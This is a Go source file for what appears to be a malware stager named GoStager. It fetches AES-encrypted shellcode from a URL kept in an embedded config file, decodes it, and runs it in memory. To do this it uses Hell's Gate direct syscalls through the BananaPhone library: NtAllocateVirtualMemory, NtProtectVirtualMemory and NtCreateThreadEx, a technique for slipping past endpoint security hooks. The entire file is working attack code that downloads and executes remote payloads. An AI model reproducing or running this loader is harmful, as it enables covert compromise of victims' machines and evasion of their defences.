package main

import (
	"GoStager/util"
	_ "embed"
	"encoding/hex"
	"io/ioutil"
	"net/http"
	"strings"
	"syscall"
	"time"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

//go:embed conf.txt
var t string

// example of using bananaphone to execute shellcode in the current thread.
// hell's gate
func main() {
	//get the shellcode by http
	c := http.Client{Timeout: time.Duration(3) * time.Second}
	conf := strings.Split(t, " ")
	req, _ := http.NewRequest("GET", conf[0], nil)
	req.Header.Add("User-Agent", conf[2])
	resp, _ := c.Do(req)
	body, _ := ioutil.ReadAll(resp.Body)
	hexSc, _ := util.DecodeAES(body, []byte(conf[1]))
	temp, _ := hex.DecodeString(string(hexSc))
	shellcode, _ := hex.DecodeString(string(temp))

	bp, _ := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	//resolve the functions and extract the syscalls
	alloc, _ := bp.GetSysID("NtAllocateVirtualMemory")
	protect, _ := bp.GetSysID("NtProtectVirtualMemory")
	createthread, _ := bp.GetSysID("NtCreateThreadEx")

	createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	var hhosthread uintptr
	bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
}
